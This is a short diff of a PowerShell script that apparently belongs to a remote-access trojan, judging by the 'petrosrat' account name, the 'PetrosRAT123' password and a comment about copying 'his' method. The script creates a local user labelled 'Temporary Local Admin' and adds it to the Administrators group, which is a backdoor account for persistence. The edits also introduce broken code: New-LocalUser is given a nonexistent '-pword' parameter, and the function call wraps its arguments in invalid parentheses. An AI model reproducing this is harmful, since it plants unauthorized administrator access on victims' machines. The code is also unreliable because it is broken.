@@ -16,7 +16,7 @@ function create_account {
     begin {
     }
     process {
-        New-LocalUser "$uname" -pword $pword -FullName "$uname" -Description "Temporary Local Admin"
+        New-LocalUser "$uname" -pword "$pword" -FullName "$uname" -Description "Temporary Local Admin"
         Write-Verbose "$uname local user created"
         Add-LocalGroupMember -Group "Administrators" -Member "$uname"
         Write-Verbose "$uname added to the local administrator group"
@@ -29,7 +29,7 @@ function create_account {
 $uname = "petrosrat"
 $password = "PetrosRAT123"   # he uses random password with the function above  $password = random_text
 $pword = (ConvertTo-SecureString $password -AsPlainText -Force)
-create_account -uname $uname -pword $pword
+create_account (-uname $uname -pword $pword)
 
 # variables
 $wd = random_text
